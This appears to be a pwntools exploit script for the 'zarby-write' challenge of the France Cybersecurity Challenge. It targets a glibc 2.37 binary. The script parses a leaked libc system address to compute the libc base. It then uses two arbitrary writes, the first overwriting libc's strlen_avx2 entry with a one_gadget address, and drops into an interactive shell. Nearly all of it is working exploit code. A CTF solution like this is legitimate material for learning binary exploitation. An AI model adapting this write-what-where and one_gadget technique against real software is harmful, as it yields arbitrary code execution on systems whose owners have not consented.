#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("zarby-write_patched", checksec=False)
libc = ELF("libs/libc-2.37.so")  
ld = ELF("libs/ld-2.37.so", checksec=False)

# Utils
def pad(data:bytes):    return data.ljust(context.bits // 8, b"\x00")

# Shortcuts
def start():               log.info("Starting exploit")
def logleak(name, val):    log.info(f"{name} @ {hex(val)}")
def shell():               log.success("Enjoy your shell :)")
def sa(delim, data):       p.sendafter(delim, data)
def sla(delim,line):       p.sendlineafter(delim, line)
def sl(line):              p.sendline(line)
def rcl(keepends=False):   return p.recvline(keepends)
def cl():                  p.clean()
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):      return p.recvuntil(d2,drop=True)


host, port = "challenges.france-cybersecurity-challenge.fr", 2102
proc_args = [exe.path]


if args.REMOTE:
  p = remote(host, port)
else:
  p = process(proc_args)
  if args.GDB:
    gdb.attach(p, gdbscript = '''
      continue      
    ''')

# Compute the libc base from the leak
system = int(rcu(b"system@libc: ", b"\n"), base=16)
libc.address = system - libc.sym["system"]  
logleak("libc base", libc.address)

# Useful libc offsets
strlen_avx2 = libc.address + 0x1f6080
one_gadget = libc.address + 0xe35a9

# First write
where1 = strlen_avx2
what1 = one_gadget

# Second write
where2 = libc.sym["_IO_2_1_stdin_"]
what2 = 0x4141414141414141

sl(f"{where1} {what1}".encode())
sl(f"{where2} {what2}".encode())

p.interactive()
